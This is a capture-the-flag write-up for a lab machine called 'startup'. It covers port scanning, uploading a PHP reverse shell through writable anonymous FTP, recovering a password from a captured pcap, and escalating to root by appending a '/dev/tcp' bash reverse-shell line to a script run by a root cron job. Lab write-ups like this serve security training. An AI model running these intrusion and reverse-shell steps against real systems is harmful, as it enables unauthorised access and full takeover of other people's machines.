## Startup

The first thing I did was scanning the ip to see what ports were open:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux;)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

The first thing I did was exploring ftp, wich lead me to some unnecessary files and a particular `ftp` folder which we could write on:

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jun 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
```

The `ftp` directory was empty so there was nothing more to see in ftp.

Since http was also open, I took a look at the website, wich looked pretty basic. I ran `gobuster` to find any hidden routes:

```
$ gobuster dir --url http://xx.xx.xxx.xxx/ --wordlist ../../../wordlists/directory_list_2.3_small.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.185.25/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ../../../wordlists/directory_list_2.3_small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 312] [--> http://10.10.185.25/files/]
Progress: 87649 / 87649 (100.00%)
===============================================================
Finished
===============================================================
```

Exploring this `files/` route I ran into what seemed to be the ftp anonymous entry. My first though was to just inject a reverse shell file and get remote access to the machine. So using this [reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) from pentestmonkey I injected it onto the `ftp` directory:

```
ftp> put shell.php ftp/shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 9,4e-05 seconds (55,7 Mbytes/s)
```

> **Note:** Make sure to edit the required lines in `shell.php` like your machine's ip and port where you're going to be listening from.

After injecting the reverse shell, I began to listen in my machine's port:

```
nc -nlvp <PORT_NUMBER>
```

and simply went to the `ftp` directory on the website and selected our reverse shell file.

Perfect! Now I had access to the machine!

```
Connection from xx.xx.xxx.xxx:43714
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:31:00 up  1:24,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Now that I was in, I began to search for anything special. Simply after making `ls` I found what would be the first flag inside a file called `recipe.txt`.

Right after getting the flag, I went to the `/home` folder to see what users existed. I found one, `lennie`, which was protected by a password.

I saw a stranged looking directory called `incidents` and inside it was a pcapng file with the name `suspicious.pcapng`.

To get the file to my machine I copied it to the website's directory:

```
$ cp /incidents/suspicious.pcapng /var/www/html/files/ftp
```

Opening it on my machine (using `Wireshark`), I click on a packet to follow the TCP stream. There was a lot of information on stream 7, very much like the logs of a user interacting with the machine, including this interesting lines:

```
www-data@startup:/$ cd home
cd home
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ ls
ls
lennie
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: c4ntg3t3n0ughsp1c3
```

We can see that a user was trying to get in lennie's folder but since it was logged as `www-data` it tried to change user by typing some incorrect password. I tried connecting via ssh as `lennie` and:

```
 ssh lennie@xx.xx.xxx.xxx
lennie@xx.xx.xxx.xxx's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

44 packages can be updated.
30 updates are security updates.


Last login: Fri Jun 28 15:14:07 2024 from xx.xx.xxx.xxx
$
```

I was in as `lennie`!

By running `ls` I found a file and two directories:

```
rwxr-xr-x  2 lennie lennie 4096 Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4096 Jun 28 15:40 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
```

So there was the second flag, inside `user.txt`.

The `Documents` directory was full of useless information, but inside `scripts` there were two files:

```
-rwxr-xr-x 1 root root 77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root root  1 Jun 28 16:52 startup_list.txt
```

The first thing I noticed was the `startup_list.txt`'s time of modification, which was exactly the same as my current time. At the time I didn't knew why that was happening so I began exploring both files. `startup_list.txt` was empty but `planner.sh` was a shell script:

```
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

It echoed a variable to the other file and then executes another shell script. This script was apparently owned by me (lennie) and it just echoed "Done!":

```
$ ls -l /etc | grep print
-rwx------ 1 lennie lennie   293 Jun 28 16:58 print.sh

$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
```

And this was it, I tried to see if there was some bin file wrongly configurated but there was not, so I was stuck for a while, until I rembered that `startup_list.txt` kept updating every minute. The only thing that could update this file was `planner.sh`, but if it wasn't me something had to be!

So if there was something executing `planner.sh`, which by itself executes `/etc/print.sh`, which I can modify, I figured that if I changed the behaviour of this file, I could figure out wich user was executing `planner.sh` by the minute, hopefully it was root so I could make some kind of RCE.

So to clear things up I added this line to `/etc/print.sh`:

```
echo 'test' > /home/lennie/test.txt
```

This would create a test file with the user I want to find out as the owner. Just as I wanted, the user executing `planner.sh` is really `root`!
```
rw-r--r-- 1 root root  5 Jun 28 17:10 test.txt
```
This meant I could write a command to spawn a remote shell and it was going to be execute as root.

So I added the following line to `print.sh` to do exactly that:

```
bash -i >& /dev/tcp/<YOUR_IP>/1235 0>&1
```

This would spawn the shell at my machine at port 1235.

By listening at that port:

```
nc -nlvp 1235
```

I was able to get the shell as root:

```
Connection from xx.xx.xxx.xxx:xxxx
bash: cannot set terminal process group (2875): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~#
```

Excelent! Simply by looking at the contents of the file `root.txt` we find the last flag!
